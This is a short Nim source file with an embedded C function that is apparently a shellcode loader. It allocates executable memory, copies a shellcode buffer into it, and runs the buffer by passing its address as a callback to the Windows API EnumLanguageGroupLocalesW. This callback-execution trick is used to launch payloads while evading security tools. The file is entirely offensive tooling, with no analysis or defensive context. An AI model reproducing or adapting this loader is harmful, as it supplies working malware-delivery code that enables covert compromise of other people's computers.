import public

{.emit: """

int EnumDesktopWNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);

    EnumLanguageGroupLocalesW((LANGGROUPLOCALE_ENUMPROCW)addr, LGRPID_ARABIC, 0, 0);
}
"""
.}

proc EnumLanguageGroupLocalesWNim(plainBuffer:cstring,size:cint):cint {.importcpp:"EnumDesktopWNim(@)",nodecl.}

discard EnumLanguageGroupLocalesWNim(code,codelen)